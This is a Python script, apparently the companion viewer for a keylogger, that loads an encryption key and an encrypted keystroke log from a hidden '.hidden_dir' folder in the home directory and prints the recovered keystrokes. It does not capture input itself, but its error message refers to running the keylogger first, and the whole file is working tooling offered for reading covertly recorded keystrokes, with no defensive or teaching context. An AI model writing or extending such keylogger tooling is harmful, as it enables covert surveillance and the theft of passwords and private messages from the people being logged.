import os
from cryptography.fernet import Fernet

hidden_dir = os.path.join(os.path.expanduser("~"), ".hidden_dir")
key_file = os.path.join(hidden_dir, "encryption_key.txt")
log_file = os.path.join(hidden_dir, "keylog_encrypted.txt")

def load_key():
    if not os.path.exists(key_file):
        raise FileNotFoundError("Encryption key not found. Run keylogger first.")
    with open(key_file, "rb") as f:
        return f.read()

def load_logs():
    if not os.path.exists(log_file):
        raise FileNotFoundError("Log file not found.")
    with open(log_file, "rb") as f:
        return f.readlines()

def main():
    key = load_key()
    cipher = Fernet(key)

    encrypted_lines = load_logs()

    print("\nDecrypted Keystrokes:\n" + "-" * 40)

    for line in encrypted_lines:
        try:
            decrypted = cipher.decrypt(line.strip()).decode()
            print(decrypted)
        except Exception:
            print("[Corrupted Entry Skipped]")

if __name__ == "__main__":
    main()
